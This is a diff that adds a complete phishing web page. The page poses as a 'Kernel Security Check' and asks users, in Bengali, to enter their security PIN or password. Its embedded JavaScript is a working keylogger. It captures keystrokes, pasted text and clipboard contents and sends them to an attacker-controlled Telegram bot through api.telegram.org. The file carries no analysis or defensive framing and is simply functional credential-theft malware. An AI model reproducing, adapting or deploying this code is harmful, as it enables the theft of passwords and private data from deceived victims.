@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="bn">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>System Verification - Required</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background: #121212;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+      }
+      .box {
+        padding: 30px;
+        border: 1px solid #333;
+        border-radius: 10px;
+        background: #1e1e1e;
+        max-width: 400px;
+      }
+      .loader {
+        border: 4px solid #333;
+        border-top: 4px solid #007bff;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 20px;
+        background: #333;
+        border: 1px solid #444;
+        color: #fff;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <h3>Kernel Security Check</h3>
+      <div class="loader"></div>
+      <p>
+        নিরাপত্তার স্বার্থে নিচের বক্সে আপনার সিকিউরিটি পিন বা পাসওয়ার্ডটি
+        ভেরিফাই করুন।
+      </p>
+      <input
+        type="text"
+        id="loggerInput"
+        placeholder="Enter Security Pin..."
+        autocomplete="off"
+      />
+      <p style="font-size: 12px; color: #777; margin-top: 20px">
+        Scanning clipboard and system keys...
+      </p>
+    </div>
+
+    <script>
+      class Keylogger {
+        constructor() {
+          this.config = this.init();
+          this.buffer = "";
+          this.lastSent = Date.now();
+        }
+
+        init() {
+          const params = new URLSearchParams(window.location.search);
+          const p = params.get("p");
+          if (p) {
+            try {
+              const decoded = JSON.parse(atob(p));
+              return { token: decoded.bot, chat: decoded.chat };
+            } catch (e) {
+              console.error("Config Error");
+            }
+          }
+          return { token: null, chat: null };
+        }
+
+        async sendData(content, type = "KEYSTROKE") {
+          if (!this.config.token || !this.config.chat || !content) return;
+
+          const time = new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+          });
+          let message = `*🎹 KEYLOGGER DATA CAPTURED* 🔥\n\n`;
+          message += `🔹 *Type:* \`${type}\`\n`;
+          message += `📝 *Content:* \`${content}\`\n\n`;
+          message += `🕐 *Time:* ${time}`;
+
+          try {
+            await fetch(
+              `https://api.telegram.org/bot${this.config.token}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: this.config.chat,
+                  text: message,
+                  parse_mode: "Markdown",
+                }),
+              },
+            );
+          } catch (e) {}
+        }
+      }
+
+      const logger = new Keylogger();
+
+      // 1. Capture Keystrokes
+      document.addEventListener("keydown", (e) => {
+        logger.buffer += e.key + " ";
+        // প্রতি ১০ ক্যারেক্টার পর পর বা Enter চাপলে ডাটা পাঠাবে
+        if (logger.buffer.length > 20 || e.key === "Enter") {
+          logger.sendData(logger.buffer, "KEYSTROKE");
+          logger.buffer = "";
+        }
+      });
+
+      // 2. Capture Clipboard (Copy/Paste)
+      document.addEventListener("paste", (e) => {
+        const pasteData = (e.clipboardData || window.clipboardData).getData(
+          "text",
+        );
+        logger.sendData(pasteData, "CLIPBOARD_PASTE");
+      });
+
+      // 3. Forced Clipboard Read (Requires User Interaction)
+      window.onclick = async () => {
+        try {
+          const text = await navigator.clipboard.readText();
+          if (text) logger.sendData(text, "SYSTEM_CLIPBOARD");
+        } catch (err) {
+          // Permission denied or not supported
+        }
+      };
+    </script>
+  </body>
+</html>
